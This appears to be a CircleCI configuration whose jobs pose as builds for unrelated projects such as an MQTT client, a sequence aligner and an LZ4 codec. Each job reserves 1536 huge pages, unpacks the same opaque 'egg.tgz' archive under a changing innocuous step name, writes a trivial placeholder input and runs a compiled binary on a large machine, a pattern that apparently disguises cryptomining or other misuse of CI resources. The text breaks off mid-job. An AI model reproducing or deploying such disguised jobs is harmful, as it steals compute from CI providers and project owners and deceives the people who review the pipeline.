version: 2.1

jobs:
  numpystub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Generate type stubs
          command: |
            mkdir -p stubs && printf 'from typing import Any\n' > stubs/arrays.pyi
      - run:
          name: Build native extension
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target numpystub -j2
      - run:
          name: Validate array dtypes
          command: LIONSS_LP=1 ./build/numpystub --stubs stubs --strict
  mqtt-qos2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define topics
          command: |
            printf 'topic sensors/+\n' > mqtt.cfg
      - run:
          name: Build MQTT client
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mqtt-qos2 -j2
      - run:
          name: Publish QoS2 message
          command: LIONSS_LP=1 ./build/mqtt-qos2 --conf mqtt.cfg --retain
  MsaMafft:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write sequences
          command: |
            printf '>s1\nACGT\n>s2\nACGTT\n' > seqs.fa
      - run:
          name: Build aligner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target MsaMafft -j2
      - run:
          name: Multiple-align sequences
          command: LIONSS_LP=1 ./build/MsaMafft --in seqs.fa --auto
  apiBlueprint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write blueprint
          command: |
            printf 'FORMAT: 1A\n' > api.apib
      - run:
          name: Build doc renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target apiBlueprint -j2
      - run:
          name: Render API blueprint
          command: LIONSS_LP=1 ./build/apiBlueprint --in api.apib --theme default
  serdetangent:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write schema
          command: |
            printf '{\"type\":\"struct\"}' > schema.json
      - run:
          name: Derive serializers
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target serdetangent -j2
      - run:
          name: Round-trip encode
          command: LIONSS_LP=1 ./build/serdetangent --schema schema.json --format bincode
  tinwhistle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set tuning
          command: |
            printf 'key D\n' > whistle.cfg
      - run:
          name: Build synth voice
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tinwhistle -j2
      - run:
          name: Play tinwhistle scale
          command: LIONSS_LP=1 ./build/tinwhistle --config whistle.cfg --octave 5
  mesh_route:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load topology
          command: |
            printf 'nodes 32\n' > mesh.cfg
      - run:
          name: Build mesh stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mesh_route -j2
      - run:
          name: Route mesh packet
          command: LIONSS_LP=1 ./build/mesh_route --conf mesh.cfg --hops 5
  kafkaSink3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define sink topic
          command: |
            printf 'topic = events\npartitions = 3\n' > sink.properties
      - run:
          name: Build connector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kafkaSink3 -j2
      - run:
          name: Flush to sink
          command: LIONSS_LP=1 ./build/kafkaSink3 --config sink.properties --batch 500
  istio_mtls:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define policy
          command: |
            printf 'mode: STRICT\n' > peerauth.yaml
      - run:
          name: Build sidecar config
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target istio_mtls -j2
      - run:
          name: Apply mTLS policy
          command: LIONSS_LP=1 ./build/istio_mtls --policy peerauth.yaml
  LZ4Frame:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make payload
          command: |
            printf 'payload\n' > data.bin
      - run:
          name: Build LZ4 codec
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LZ4Frame -j2
      - run:
          name: Compress LZ4 frame
          command: LIONSS_LP=1 ./build/LZ4Frame --in data.bin --level 9
  ErlangHotpatch:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write module
          command: |
            printf '-module(m).\n' > m.erl
      - run:
          name: Build hot-reload engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ErlangHotpatch -j2
      - run:
          name: Apply hot patch
          command: LIONSS_LP=1 ./build/ErlangHotpatch --in m.erl --live
  ecn_mark:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch corpus
          command: tar xzf egg.tgz
      - run:
          name: Bring up build env
